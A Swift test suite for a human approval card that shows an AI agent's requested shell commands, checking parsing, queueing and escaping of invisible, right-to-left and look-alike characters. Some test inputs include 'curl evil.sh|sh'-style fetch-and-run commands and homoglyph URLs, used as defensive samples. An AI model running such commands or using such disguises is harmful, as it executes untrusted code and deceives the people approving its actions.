import CoreText
import Foundation

// Pure tests of the Hermes approval model: parsing, the text the card shows, the answer mapping, the queue
// and the wire builders. No network, no UI. The transports are tested against the fakes in HermesSignInTests
// and HermesChatTests.

@main
enum HermesApprovalTests {
    static var failures = 0

    static func check<T: Equatable>(_ label: String, _ got: T, _ expected: T) {
        if got == expected { print("  ✓ \(label)") }
        else { print("  ✗ \(label)\n    got:      \(got)\n    expected: \(expected)"); failures += 1 }
    }
    static func ok(_ label: String, _ value: Bool) {
        if value { print("  ✓ \(label)") } else { print("  ✗ \(label)"); failures += 1 }
    }

    typealias HA = HermesApproval
    typealias Choice = HermesApproval.Choice
    typealias Queue = HermesApprovalQueue

    // MARK: Fixtures

    static func json(_ o: [String: Any]) -> String {
        String(decoding: try! JSONSerialization.data(withJSONObject: o, options: [.sortedKeys]), as: UTF8.self)
    }

    static func frame(id: Any = "srq-0123456789ab", method: String = "approval", params: [String: Any]? = nil) -> String {
        let p: [String: Any] = params ?? [
            "session_id": "run-1", "request_id": "r1", "command": "rm -rf build/", "description": "delete",
            "choices": ["once", "session", "always", "deny"], "allow_permanent": true, "allow_session": true,
            "pattern_key": "recursive delete", "tool_name": "terminal", "unknown_extra": ["a": 1]]
        return json(["jsonrpc": "2.0", "id": id, "method": method, "params": p])
    }

    static func params(_ patch: [String: Any?]) -> [String: Any] {
        var p: [String: Any] = [
            "session_id": "run-1", "request_id": "r1", "command": "rm -rf build/", "description": "d",
            "choices": ["once", "session", "always", "deny"]]
        for (k, v) in patch { if let v { p[k] = v } else { p.removeValue(forKey: k) } }
        return p
    }

    static func apiEvent(_ patch: [String: Any?] = [:]) -> String {
        var p: [String: Any] = [
            "event": "approval.request", "run_id": "chatcmpl-0123456789abcdef0123456789abc", "timestamp": 1.0,
            "session_id": "s1", "request_id": "r9", "command": "rm -rf /tmp/x", "description": "d",
            "choices": ["once", "session", "always", "deny"], "pattern_key": "k", "allow_permanent": true, "allow_session": true]
        for (k, v) in patch { if let v { p[k] = v } else { p.removeValue(forKey: k) } }
        return json(p)
    }

    static func req(_ id: String = "r1", command: String = "rm -rf build/", choices: Set<Choice> = [.once, .session, .always, .deny],
                    agent: String = "alfred") -> HermesApprovalRequest {
        HermesApprovalRequest(agentName: agent, origin: .signIn(frameID: "srq-" + id, runtimeSession: "run-1"), requestID: id,
                              command: command, description: "recursive delete", choices: choices, patternKeys: ["recursive delete"])
    }

    static func shown(_ q: inout Queue, _ id: String, turn: Int = 1, command: String = "rm -rf build/") {
        _ = q.add(req(id, command: command), display: HA.display(command), turn: turn)
    }

    // MARK: Main

    static func main() {
        parsing()
        displayText()
        decisions()
        queue()
        inlineTier()
        rightToLeft()
        lookAlikes()
        masks()
        escapeEverything()
        grants()
        wire()
        if failures > 0 { print("\(failures) FAILED"); exit(1) }
        print("Hermes approval: all cases passed")
    }

    // MARK: 11.1 Parsing

    static func parsing() {
        print("parse (sign in)")
        let r = HA.parseSignIn(frame(), agent: "alfred")
        check("parse_signin_full_payload_reads_ids_command_choices request id", r?.requestID, "r1")
        check("  command", r?.command, "rm -rf build/")
        check("  choices", r?.choices, [.once, .session, .always, .deny])
        check("  origin", r?.origin, .signIn(frameID: "srq-0123456789ab", runtimeSession: "run-1"))
        check("  agent", r?.agentName, "alfred")
        check("parse_signin_missing_request_id_is_rejected", HA.parseSignIn(frame(params: params(["request_id": nil])), agent: "a") == nil, true)
        check("parse_signin_empty_request_id_is_rejected", HA.parseSignIn(frame(params: params(["request_id": ""])), agent: "a") == nil, true)
        check("parse_signin_request_id_with_slash_is_rejected", HA.parseSignIn(frame(params: params(["request_id": "a/b"])), agent: "a") == nil, true)
        check("parse_signin_request_id_with_quote_is_rejected", HA.parseSignIn(frame(params: params(["request_id": "a\"b"])), agent: "a") == nil, true)
        check("parse_signin_request_id_over_64_is_rejected", HA.parseSignIn(frame(params: params(["request_id": String(repeating: "a", count: 65)])), agent: "a") == nil, true)
        check("parse_signin_request_id_64_is_accepted", HA.parseSignIn(frame(params: params(["request_id": String(repeating: "a", count: 64)])), agent: "a") != nil, true)
        check("parse_signin_frame_id_not_srq_is_rejected", HA.parseSignIn(frame(id: "abc-0123456789ab"), agent: "a") == nil, true)
        check("parse_signin_frame_id_integer_is_rejected", HA.parseSignIn(frame(id: 7), agent: "a") == nil, true)
        check("parse_signin_frame_id_not_hex_is_rejected", HA.parseSignIn(frame(id: "srq-zzzzzzzzzzzz"), agent: "a") == nil, true)
        check("parse_signin_other_method_is_rejected", HA.parseSignIn(frame(method: "sudo"), agent: "a") == nil, true)
        check("parse_signin_no_session_is_rejected", HA.parseSignIn(frame(params: params(["session_id": nil])), agent: "a") == nil, true)
        check("parse_signin_choices_without_deny_is_rejected", HA.parseSignIn(frame(params: params(["choices": ["once", "session"]])), agent: "a") == nil, true)
        check("parse_signin_choices_without_once_is_rejected", HA.parseSignIn(frame(params: params(["choices": ["deny", "always"]])), agent: "a") == nil, true)
        check("parse_signin_no_choices_is_rejected", HA.parseSignIn(frame(params: params(["choices": nil])), agent: "a") == nil, true)
        let unknown = HA.parseSignIn(frame(params: params(["choices": ["once", "deny", "teleport", 5]])), agent: "a")
        check("parse_signin_unknown_choice_is_dropped_not_fatal", unknown?.choices, [.once, .deny])
        check("parse_signin_command_not_a_string_is_rejected", HA.parseSignIn(frame(params: params(["command": 5])), agent: "a") == nil, true)
        check("parse_signin_empty_command_is_rejected", HA.parseSignIn(frame(params: params(["command": "  \n\t "])), agent: "a") == nil, true)
        check("parse_signin_extra_keys_are_ignored", r != nil, true)
        let big = HA.parseSignIn(frame(params: params(["command": String(repeating: "x", count: 70_000)])), agent: "a")
        check("parse_signin_oversized_payload_is_rejected", big == nil, true)
        check("parse_signin_malformed_json_is_rejected", HA.parseSignIn("{not json", agent: "a") == nil, true)
        check("allow_session false removes session", HA.parseSignIn(frame(params: params(["allow_session": false])), agent: "a")?.choices, [.once, .always, .deny])
        check("allow_permanent false removes always", HA.parseSignIn(frame(params: params(["allow_permanent": false])), agent: "a")?.choices, [.once, .session, .deny])
        check("smart_denied leaves once and deny", HA.parseSignIn(frame(params: params(["smart_denied": true])), agent: "a")?.choices, [.once, .deny])

        print("parse (api key)")
        let a = HA.parseAPIEvent(apiEvent(), agent: "mark")
        check("parse_api_event_full_payload id", a?.requestID, "r9")
        check("  origin", a?.origin, .apiKey(runID: "chatcmpl-0123456789abcdef0123456789abc"))
        check("  command", a?.command, "rm -rf /tmp/x")
        check("  choices", a?.choices, [.once, .session, .always, .deny])
        check("parse_api_run_id_must_be_chatcmpl_hex", HA.parseAPIEvent(apiEvent(["run_id": "run-123"]), agent: "m") == nil, true)
        check("  uppercase hex", HA.parseAPIEvent(apiEvent(["run_id": "chatcmpl-ABC"]), agent: "m") == nil, true)
        check("parse_api_run_id_with_path_characters_is_rejected", HA.parseAPIEvent(apiEvent(["run_id": "chatcmpl-ab/../x"]), agent: "m") == nil, true)
        check("  query characters", HA.parseAPIEvent(apiEvent(["run_id": "chatcmpl-ab?x=1"]), agent: "m") == nil, true)
        check("  missing run id", HA.parseAPIEvent(apiEvent(["run_id": nil]), agent: "m") == nil, true)
        check("parse_api_event_malformed_json_is_rejected", HA.parseAPIEvent("{oops", agent: "m") == nil, true)
        check("  no deny", HA.parseAPIEvent(apiEvent(["choices": ["once"]]), agent: "m") == nil, true)
        check("  oversized", HA.parseAPIEvent(apiEvent(["command": String(repeating: "y", count: 70_000)]), agent: "m") == nil, true)
        check("  bad request id", HA.parseAPIEvent(apiEvent(["request_id": "../x"]), agent: "m") == nil, true)
    }

    // MARK: 11.2 Display text

    static func runs(_ d: HermesApprovalDisplay, _ kind: HermesApprovalDisplay.Kind) -> [String] { d.runs.filter { $0.kind == kind }.map(\.text) }

    static func displayText() {
        print("display")
        let plain = HA.display("rm -rf build/")
        check("display_plain_ascii_is_unchanged", plain.plain, "rm -rf build/")
        check("  inline tier", plain.tier, .inline)
        check("  no marks", plain.runs.allSatisfy { $0.kind == .plain }, true)
        let nl = HA.display("ls\nrm -rf x")
        check("display_newline_becomes_visible_mark_and_break", nl.plain, "ls⏎\nrm -rf x")
        check("  mark kind", runs(nl, .visible), ["⏎"])
        check("  lines", nl.lineCount, 2)
        let tab = HA.display("a\tb\rc")
        check("display_tab_and_carriage_return_are_marked", tab.plain, "a⇥b␍c")
        let esc = HA.display("echo \u{1B}[31mred\u{1B}[0m")
        check("display_escape_sequence_is_not_interpreted", esc.plain.contains("\u{1B}"), false)
        check("  shown as escape marks", runs(esc, .escape), ["⟨U+001B⟩", "⟨U+001B⟩"])
        let c1 = HA.display("a\u{85}b\u{9B}c\u{7F}d\u{0}e")
        check("display_c1_controls_are_escaped", runs(c1, .escape), ["⟨U+0085⟩", "⟨U+009B⟩", "⟨U+007F⟩", "⟨U+0000⟩"])
        let rlo = HA.display("cat \u{202E}gpj.sh\u{202C}")
        check("display_bidi_override_is_escaped", rlo.plain.unicodeScalars.contains { $0.value == 0x202E || $0.value == 0x202C }, false)
        check("  escape marks", runs(rlo, .escape), ["⟨U+202E⟩", "⟨U+202C⟩"])
        let iso = HA.display("a\u{2066}b\u{2069}c\u{200E}d\u{200F}e\u{061C}f\u{202A}g\u{202B}h\u{202D}i")
        check("display_bidi_isolates_and_marks_are_escaped", runs(iso, .escape).count, 8)
        check("  none left raw", iso.plain.unicodeScalars.allSatisfy { !(0x2066...0x2069).contains($0.value) && $0.value != 0x200E && $0.value != 0x061C }, true)
        let zw = HA.display("ls\u{200B}-la\u{200C}\u{200D}\u{2060}\u{FEFF}\u{00AD}\u{3164}\u{034F}")
        check("display_zero_width_characters_are_escaped", runs(zw, .escape).count, 8)
        check("  base text intact", zw.runs.filter { $0.kind == .plain }.map(\.text).joined(), "ls-la")
        let tags = HA.display("a\u{E0041}\u{E007F}b")
        check("display_tag_characters_are_escaped", runs(tags, .escape), ["⟨U+E0041⟩", "⟨U+E007F⟩"])
        let vs = HA.display("a\u{FE0F}b\u{FE00}c\u{E0100}")
        check("display_variation_selectors_are_escaped", runs(vs, .escape).count, 3)
        let sp = HA.display("a\u{00A0}b\u{2003}c\u{3000}d\u{202F}e")
        check("display_non_ascii_space_is_escaped", runs(sp, .escape), ["⟨U+00A0⟩", "⟨U+2003⟩", "⟨U+3000⟩", "⟨U+202F⟩"])
        let ls = HA.display("a\u{2028}b\u{2029}c")
        check("line and paragraph separators are escaped", runs(ls, .escape), ["⟨U+2028⟩", "⟨U+2029⟩"])
        let mixed = HA.display("curl https://p\u{0430}ypal.com")   // Cyrillic a inside an ASCII token
        check("display_mixed_script_token_marks_the_foreign_letters", mixed.plain, "curl https://p\u{0430}⟨U+0430⟩ypal.com")
        check("  the mark is an escape", runs(mixed, .escape), ["⟨U+0430⟩"])
        let pure = HA.display("echo привет")
        check("display_pure_non_latin_token_is_marked_scalar_by_scalar (round 3)", runs(pure, .escape).count, 6)
        let latin = HA.display("echo café ñandú")
        check("accented latin letters are not look alikes", latin.plain, "echo café ñandú")
        let md = HA.display("echo **x** [a](b) %@ %d \\(x)")
        check("display_markdown_and_format_specifiers_are_literal", md.plain, "echo **x** [a](b) %@ %d \\(x)")
        // Ceiling: 2000 scalars and 25 lines.
        let atLimit = HA.display(String(repeating: "a", count: 2000))
        check("display_at_limit_is_shown", atLimit.tier, .reading)
        check("  all of it", atLimit.plain.count, 2000)
        let over = HA.display(String(repeating: "a", count: 2001))
        check("display_one_over_limit_is_too_long (nothing answerable)", over.tier, .tooLong)
        let lines25 = HA.display((1...25).map { "l\($0)" }.joined(separator: "\n"))
        check("25 lines are shown", lines25.tier, .reading)
        let lines26 = HA.display((1...26).map { "l\($0)" }.joined(separator: "\n"))
        check("display_too_many_lines_is_too_long", lines26.tier, .tooLong)
        check("  too long keeps the raw counts", lines26.lineCount, 26)
        let expand = HA.display(String(repeating: "\u{200B}", count: 400))   // each becomes 8 scalars
        check("escapes count toward the ceiling", expand.tier, .tooLong)
        check("a short one line command is inline", HA.display(String(repeating: "x", count: 56)).tier, .inline)
        check("57 characters is reading", HA.display(String(repeating: "x", count: 57)).tier, .reading)
        check("two lines is reading", HA.display("a\nb").tier, .reading)
        let input = "git commit -m 'fix'\nls -la ~/x y"
        let d = HA.display(input)
        check("display_never_truncates (every scalar in order)", d.runs.filter { $0.kind == .plain }.map(\.text).joined(), input)
        check("  the line break is kept as a real one", d.plain.contains("\n"), true)
        let tooLongPreview = HA.display("first\nsecond\nthird\n" + String(repeating: "z", count: 3000))
        let tlp = tooLongPreview.closedPreview(rows: 2)
        check("preview of a too long command: first two lines only, no break after the last", tlp.runs.map(\.text).joined(), "first⏎\nsecond⏎")
        check("  the hidden lines are counted", tlp.hiddenLines, tooLongPreview.lineCount - 2)
        check("display_is_deterministic", HA.display("a\u{202E}b\nc") == HA.display("a\u{202E}b\nc"), true)
        let token = String(repeating: "A", count: 112)
        check("a long token stays whole", HA.display("echo " + token).plain, "echo " + token)
    }

    // MARK: 11.3 Decision mapping

    static func decisions() {
        print("decision")
        let r = req()
        check("allow_maps_to_once", HA.decision(for: "allow", request: r), .once)
        check("once", HA.decision(for: "once", request: r), .once)
        check("deny_maps_to_deny", HA.decision(for: "deny", request: r), .deny)
        check("session is offered", HA.decision(for: "session", request: r), .session)
        check("always is offered", HA.decision(for: "always", request: r), .always)
        check("always_maps_to_nothing_when_the_server_did_not_offer_it", HA.decision(for: "always", request: req(choices: [.once, .deny])), nil)
        check("session maps to nothing when not offered", HA.decision(for: "session", request: req(choices: [.once, .deny, .always])), nil)
        check("ask_maps_to_nothing", HA.decision(for: "ask", request: r), nil)
        check("unknown_button_maps_to_nothing", HA.decision(for: "teleport", request: r), nil)
        check("empty button maps to nothing", HA.decision(for: "", request: r), nil)
        check("allow_is_nothing_when_server_did_not_offer_once", HA.decision(for: "allow", request: req(choices: [.deny])), nil)
        let long = HA.display("a\nb")
        check("reading: allow needs the end of the text", HA.mayAnswer(.once, display: long, reachedEnd: false), false)
        check("reading: allow after the end", HA.mayAnswer(.once, display: long, reachedEnd: true), true)
        check("reading: deny never needs the end", HA.mayAnswer(.deny, display: long, reachedEnd: false), true)
        let tooLong = HA.display(String(repeating: "a", count: 5000))
        check("too long: nothing that allows, even at the end", HA.mayAnswer(.once, display: tooLong, reachedEnd: true), false)
        check("  session", HA.mayAnswer(.session, display: tooLong, reachedEnd: true), false)
        check("  always", HA.mayAnswer(.always, display: tooLong, reachedEnd: true), false)
        check("too long: deny stays", HA.mayAnswer(.deny, display: tooLong, reachedEnd: false), true)
        check("inline: allow right away", HA.mayAnswer(.once, display: HA.display("ls"), reachedEnd: false), true)
        check("hermes_pill_hides_always_button_condition (pill ids)", HA.isHermesPill("agent_hermes_alfred"), true)
        check("  the hook pill is not one", HA.isHermesPill("agent_hermes"), false)
        check("  claude is not one", HA.isHermesPill("integration_claude"), false)
        check("reaches_phone_is_false_for_hermes_pills (the predicate the relay files call)", HA.reachesPhone(pillId: "agent_hermes_alfred"), false)
        check("  other pills still go", HA.reachesPhone(pillId: "integration_claude"), true)
        check("card_identity_for_hermes_holds_the_request_id_and_no_command",
              HA.cardIdentity(request: req("r7"), pillId: "agent_hermes_alfred").inputKey, "r7")
        check("  session id carries agent and request", HA.cardIdentity(request: req("r7"), pillId: "agent_hermes_alfred").sessionId, "hermes:alfred:r7")
    }

    // MARK: 11.4 Queue and state machine

    static func queue() {
        print("queue")
        var q = Queue()
        check("nothing shown on an empty queue", q.shownID, nil)
        ok("an empty queue has nothing waiting", !q.hasWaiting)
        shown(&q, "a")
        check("first_request_is_shown_when_slot_is_free", q.promoteNext()?.request.requestID, "a")
        check("  sound on the first promotion", { var z = Queue(); shown(&z, "a"); return z.promoteNext()?.playSound ?? false }(), true)
        check("  shown id", q.shownID, "a")
        shown(&q, "b")
        check("second_request_waits_behind_the_first", q.promoteNext() == nil, true)
        check("  one waiting behind", q.waitingBehind, 1)
        check("  the first stays shown", q.shownID, "a")
        // click answers one request only
        q.select(.session)
        check("scope selected", q.scope, .session)
        let c1 = q.click(.once, id: "a")
        check("one_click_answers_one_request_only", { if case .send(let r, let c) = c1 { return r.requestID == "a" && c == .once }; return false }(), true)
        check("  a second click on the same card is dropped", q.click(.once, id: "a"), .dropped)
        check("  the other request was not touched", q.waitingBehind, 1)
        check("scope goes back to once on a click", q.scope, .once)
        check("answering_the_first_promotes_the_second", q.promoteNext()?.request.requestID, "b")
        check("  and it is the one shown", q.shownID, "b")
        // duplicate id
        check("duplicate_request_id_is_ignored", q.add(req("b"), display: HA.display("x"), turn: 1), .duplicate)
        check("  also while answering", q.add(req("a"), display: HA.display("x"), turn: 1), .duplicate)
        // ninth
        var f = Queue()
        for i in 1...8 { _ = f.add(req("q\(i)", agent: i % 2 == 0 ? "alfred" : "mark"), display: HA.display("ls"), turn: 1) }
        check("ninth_request_is_not_shown", f.add(req("q9", agent: "zeta"), display: HA.display("ls"), turn: 1), .full)
        var share = Queue()
        for i in 1...4 { _ = share.add(req("s\(i)"), display: HA.display("ls"), turn: 1) }
        check("per_agent_share: the fifth request of one agent is refused", share.add(req("s5"), display: HA.display("ls"), turn: 1), .agentFull)
        check("  another agent still fits", share.add(req("t1", agent: "mark"), display: HA.display("ls"), turn: 1), .queued)
        // withdrawn
        var w = Queue()
        shown(&w, "a"); shown(&w, "b")
        _ = w.promoteNext()
        check("withdrawn_while_queued_is_dropped_silently", w.withdraw("b"), .droppedQueued)
        check("  the shown one is untouched", w.shownID, "a")
        check("withdrawn_while_shown_removes_card_with_reason_note", { if case .endedShown(let r) = w.withdraw("a") { return r.requestID == "a" }; return false }(), true)
        check("  nothing shown after", w.shownID, nil)
        check("withdrawal_of_unknown_id_changes_nothing", w.withdraw("zzz"), .none)
        // click for an id that left the screen
        var s = Queue()
        shown(&s, "a"); shown(&s, "b")
        _ = s.promoteNext()
        check("click_for_an_id_that_left_the_screen_is_dropped", s.click(.once, id: "b"), .dropped)
        check("  nor an unknown id", s.click(.deny, id: "nope"), .dropped)
        check("  nor a choice the server did not offer", { () -> Queue.ClickResult in var z = Queue(); _ = z.add(req("a", choices: [.once, .deny]), display: HA.display("ls"), turn: 1); _ = z.promoteNext(); return z.click(.always, id: "a") }(), .dropped)
        // requeue
        var rq = Queue()
        shown(&rq, "a"); shown(&rq, "b")
        _ = rq.promoteNext()
        rq.select(.always)
        rq.requeueShown()
        check("hook_card_arrival_requeues_the_shown_hermes_card_at_the_head", rq.shownID, nil)
        check("  scope resets", rq.scope, .once)
        let back = rq.promoteNext()
        check("  the same request comes back first", back?.request.requestID, "a")
        check("requeued_card_does_not_play_the_sound_again", back?.playSound, false)
        // no transition sends without a click
        var n = Queue()
        shown(&n, "a"); _ = n.promoteNext(); n.requeueShown(); _ = n.promoteNext(); _ = n.withdraw("zz"); n.select(.session); n.markReachedEnd("a")
        check("queue_transitions_other_than_click_never_enter_answering (promote, requeue, withdraw, select, mark end)", n.entries.filter { $0.phase == .answering }.count, 0)
        // reading: Allow needs the end
        var rd = Queue()
        shown(&rd, "a", command: "line1\nline2")
        _ = rd.promoteNext()
        check("reading: allow is refused before the end", rd.click(.once, id: "a"), .dropped)
        rd.markReachedEnd("a")
        check("reading: allowed after the end", { if case .send = rd.click(.once, id: "a") { return true }; return false }(), true)
        var tl = Queue()
        shown(&tl, "a", command: String(repeating: "q", count: 3000))
        _ = tl.promoteNext(); tl.markReachedEnd("a")
        check("too long: allow never", tl.click(.once, id: "a"), .dropped)
        check("too long: deny works", { if case .send(_, let c) = tl.click(.deny, id: "a") { return c == .deny }; return false }(), true)
        // reached end is per request: the next request starts again at the top
        var re = Queue()
        shown(&re, "a", command: "x\ny"); shown(&re, "b", command: "x\ny")
        _ = re.promoteNext(); re.markReachedEnd("a"); _ = re.click(.deny, id: "a"); _ = re.promoteNext()
        check("the end of the previous text does not carry over", re.click(.once, id: "b"), .dropped)
        // scope only to offered values
        var so = Queue()
        _ = so.add(req("a", choices: [.once, .deny]), display: HA.display("ls"), turn: 1); _ = so.promoteNext()
        so.select(.always)
        check("scope not offered is ignored", so.scope, .once)
        // turn and agent withdrawal
        var t = Queue()
        _ = t.add(req("a"), display: HA.display("ls"), turn: 1); _ = t.add(req("b"), display: HA.display("ls"), turn: 2)
        _ = t.add(req("c"), display: HA.display("ls"), turn: 1)
        _ = t.promoteNext()
        let wt = t.withdrawAll(turn: 1)
        check("socket_loss_withdraws_every_request_of_that_turn_only: ended card", wt.endedShown?.requestID, "a")
        check("  dropped queued", wt.dropped, 1)
        check("  the other turn stays", t.entries.map(\.request.requestID), ["b"])
        var te = Queue()
        _ = te.add(req("a"), display: HA.display("ls"), turn: 5)
        check("turn_end_withdraws_remaining_requests", te.withdrawAll(turn: 5).dropped, 1)
        var ar = Queue()
        _ = ar.add(req("a", agent: "alfred"), display: HA.display("ls"), turn: 1); _ = ar.add(req("b", agent: "mark"), display: HA.display("ls"), turn: 2)
        let wa = ar.withdrawAll(agent: "alfred")
        check("agent_removed_withdraws_its_requests", wa.dropped, 1)
        check("  the other agent's stay", ar.entries.map(\.request.requestID), ["b"])
        // failed answer does not reshow
        var fa = Queue()
        shown(&fa, "a"); _ = fa.promoteNext(); _ = fa.click(.once, id: "a")
        fa.finish("a")
        check("failed_answer_does_not_reshow_by_itself", fa.promoteNext() == nil, true)
        // pending list
        var pl = Queue()
        shown(&pl, "a"); shown(&pl, "b"); shown(&pl, "c")
        _ = pl.promoteNext()
        let stale = pl.retain(ids: ["b"], knownBefore: ["a", "b"], turn: 1)
        check("pending_list_without_the_id_withdraws_it", stale.endedShown?.requestID, "a")
        check("  a request that arrived after the query is kept", pl.entries.map(\.request.requestID), ["b", "c"])
        // demo guard
        var dg = Queue()
        ok("demo_pending_is_false_when_empty", !dg.hasWaiting)
        shown(&dg, "a")
        ok("queue_has_waiting_while_a_hermes_request_waits (what DemoEngine reads)", dg.hasWaiting)
        _ = dg.promoteNext()
        ok("  and while it is shown", dg.hasWaiting)
        _ = dg.click(.deny, id: "a")
        ok("  but not while only an answer is in flight", !dg.hasWaiting)
        // The order rule for a freed slot is a pure function; the five call sites are covered by the center tests.
        check("the lock itself ignores a click for 0.7 s", CardInputLock.isLocked(armedAt: CardInputLock.armedAt(cardWasVisible: true, now: 10), now: 10.3), true)
        check("next_for_free_slot_prefers_cmux_then_hermes (the rule only)", HA.nextForFreeSlot(cmuxWaiting: true, hermesWaiting: true), .cmux)
        check("  hermes when cmux is empty", HA.nextForFreeSlot(cmuxWaiting: false, hermesWaiting: true), .hermes)
        check("  nothing", HA.nextForFreeSlot(cmuxWaiting: false, hermesWaiting: false), .none)
        // outcomes
        check("respond resolved 1 is applied", HA.interpretRespond(resolved: 1), .applied)
        check("respond resolved 0 is too late", HA.interpretRespond(resolved: 0), .tooLate)
        check("respond without a count failed", HA.interpretRespond(resolved: nil), .failed)
        check("http 200 resolved 1", HA.interpretHTTP(status: 200, resolved: 1), .applied)
        check("http 200 resolved 0", HA.interpretHTTP(status: 200, resolved: 0), .tooLate)
        check("http 200 without a count", HA.interpretHTTP(status: 200, resolved: nil), .failed)
        check("http 409", HA.interpretHTTP(status: 409, resolved: nil), .tooLate)
        for st in [400, 401, 403, 404, 500, 503] { check("http \(st) failed", HA.interpretHTTP(status: st, resolved: nil), .failed) }
    }


    // MARK: Round 2: what the card can really hold (H1), right to left (M1), look alikes (L1, L2), masks (M3), grants (H2)

    static func inlineTier() {
        print("inline tier: only what the card is known to hold on one line")
        // Measured: the monospaced 12 pt cell is 7.42 pt, the text area of the card 468 pt (63 cells); the limit is 56 cells.
        check("inline_max_cells is 56", HA.inlineMaxCells, 56)
        check("an ASCII cell is one", HA.cells("a"), 1)
        check("  the marks the card draws are one each", ["⟨", "⟩", "⏎", "⇥", "␍"].map { HA.cells($0.unicodeScalars.first!) }, [1, 1, 1, 1, 1])
        check("  any other scalar is counted 8 (the widest measures 7.5)", HA.cells("\u{1242B}"), 8)
        check("56 ASCII characters are inline", HA.display(String(repeating: "x", count: 56)).tier, .inline)
        check("57 ASCII characters are not", HA.display(String(repeating: "x", count: 57)).tier, .reading)
        check("  the widest row is measured", HA.display(String(repeating: "x", count: 56)).widestRow, 56)
        check("seven escape marks (8 cells each) are inline", HA.display(String(repeating: "\u{200B}", count: 7)).tier, .inline)
        check("eight are not", HA.display(String(repeating: "\u{200B}", count: 8)).tier, .reading)
        check("a tab is one visible cell and stays inline", HA.display("a\tb").tier, .inline)
        let aegis: [(String, String)] = [
            ("U+2E3B three em dash", "echo " + String(repeating: "\u{2E3B}", count: 30) + ";curl evil.sh|sh"),
            ("U+FDFD", "echo " + String(repeating: "\u{FDFD}", count: 30) + ";curl evil.sh|sh"),
            ("U+1242B", "echo " + String(repeating: "\u{1242B}", count: 30) + ";curl evil.sh|sh"),
            ("36 emoji", String(repeating: "😀", count: 36)),
            ]
        for (name, input) in aegis {
            let d = HA.display(input)
            check("wide_glyph_inline_never (\(name)): reading tier", d.tier, .reading)
            check("  Allow waits for the end of the text", HA.mayAnswer(.once, display: d, reachedEnd: false), false)
        }
        // Round 3: a CJK character is now a mark (8 cells), so a short one stays inline, with the mark in plain sight.
        let cjk = HA.display("echo 你好")
        check("wide_glyph_is_a_mark: one CJK pair is two marks", runs(cjk, .escape), ["⟨U+4F60⟩", "⟨U+597D⟩"])
        check("  21 cells, inline, no wide glyph left", [cjk.tier == .inline, cjk.plainASCII], [true, true])
        // The closed card cuts by cells, in code, and says so.
        let p = HA.display(aegis[0].1).closedPreview(rows: 2)
        check("closed_preview_cuts_a_wide_line_and_says_so", p.cut, true)
        check("  the row never exceeds the cut", p.runs.map(\.text).joined().unicodeScalars.reduce(0) { $0 + HA.cells($1) } <= HA.rowMaxCells, true)
        let longASCII = HA.display(String(repeating: "x", count: 100)).closedPreview(rows: 2)
        check("  a long ASCII line is cut at 56 cells", longASCII.runs.map(\.text).joined().count, 56)
        check("  and announced", longASCII.cut, true)
        let three = HA.display("one\ntwo\nthree\nfour").closedPreview(rows: 2)
        check("  two lines of a four line command: text", three.runs.map(\.text).joined(), "one⏎\ntwo⏎")
        check("  nothing cut, two lines hidden", [three.cut ? 1 : 0, three.hiddenLines], [0, 2])
        let exact = HA.display("one\ntwo").closedPreview(rows: 2)
        check("  a command of exactly two lines hides nothing", [exact.cut ? 1 : 0, exact.hiddenLines], [0, 0])
        let marks = HA.display(String(repeating: "\u{200B}", count: 9)).closedPreview(rows: 1)
        check("  whole marks only: 9 marks of 8 cells keep 7", marks.runs.filter { $0.kind == .escape }.count, 7)
        let one = HA.display("a\nb").closedPreview(rows: 1)
        check("  one row of a two line command keeps the mark of the break and no break", one.runs.map(\.text).joined(), "a⏎")
    }

    static func readsLeftToRight(_ text: String) -> Bool {
        let font = CTFontCreateWithName("Menlo" as CFString, 12, nil)
        let attr = CFAttributedStringCreate(nil, text as CFString, [kCTFontAttributeName: font] as CFDictionary)!
        let line = CTLineCreateWithAttributedString(attr)
        let runs = CTLineGetGlyphRuns(line) as! [CTRun]
        return !runs.contains { CTRunGetStatus($0).contains(.rightToLeft) }
    }

    static func rightToLeft() {
        print("right to left letters never reorder a command")
        let inputs = ["mv \u{05D0} \u{05D1}", "cat \u{05D0} > \u{05D1}", "mv \u{0627}\u{0628} \u{062A}", "echo \u{FB1D}\u{FE70}", "ls \u{10800}\u{1E900}\u{07C0}"]
        for input in inputs {
            check("the raw text would read right to left: \(input.unicodeScalars.map { String($0.value, radix: 16) }.prefix(5))", readsLeftToRight(input), false)
            let d = HA.display(input)
            check("  rtl_scalar_is_shown_as_a_mark: none left in the shown text", d.plain.unicodeScalars.contains { HA.isRightToLeft($0.value) }, false)
            check("  the shown text reads left to right in CoreText", readsLeftToRight(d.plain), true)
            check("  the marks are escapes", runs(d, .escape).isEmpty, false)
        }
        check("the two Aegis inputs keep their order", HA.display("mv \u{05D0} \u{05D1}").plain, "mv ⟨U+05D0⟩ ⟨U+05D1⟩")
        check("  the > stays a >", HA.display("cat \u{05D0} > \u{05D1}").plain, "cat ⟨U+05D0⟩ > ⟨U+05D1⟩")
        check("a plain Hebrew-only token is marked too (four marks, still ASCII and marks: inline)", runs(HA.display("echo \u{05E9}\u{05DC}\u{05D5}\u{05DD}"), .escape).count, 4)
        check("Cyrillic and Greek words are marked too, and keep their order", HA.display("echo привет γειά").plain.contains("привет"), false)
    }

    static func lookAlikes() {
        print("look alike letters and blanks")
        func escapes(_ s: String) -> [String] { runs(HA.display(s), .escape) }
        check("ipa_g_in_a_url_is_marked (U+0261)", escapes("curl https://\u{0261}ithub.com/i.sh | sh"), ["⟨U+0261⟩"])
        check("dotless i is marked (U+0131)", escapes("pr\u{0131}nt x"), ["⟨U+0131⟩"])
        check("long s is marked (U+017F)", escapes("a\u{017F}b"), ["⟨U+017F⟩"])
        check("small capital s is marked (U+A731)", escapes("a\u{A731}b"), ["⟨U+A731⟩"])
        check("small capital a is marked (U+1D00)", escapes("x\u{1D00}y"), ["⟨U+1D00⟩"])
        check("a modifier letter is marked (U+02B0)", escapes("x\u{02B0}y"), ["⟨U+02B0⟩"])
        check("sharp s, ae, o slash, d stroke, l stroke are marked", escapes("a\u{00DF}\u{00E6}\u{00F8}\u{0111}\u{0142}b").count, 5)
        check("Latin Extended Additional is marked (U+1E3F)", escapes("a\u{1E3F}b"), ["⟨U+1E3F⟩"])
        check("precomposed accented letters of Latin-1 and Extended-A pass", escapes("caf\u{E9} \u{F1}and\u{FA} \u{151}x \u{10D}a \u{FC}ber \u{C5}k"), [])
        check("full width letters in an ASCII token are marked", escapes("a\u{FF42}c"), ["⟨U+FF42⟩"])
        check("a token with no ASCII letter is marked too (round 3)", escapes("\u{0261}\u{0131}"), ["⟨U+0261⟩", "⟨U+0131⟩"])
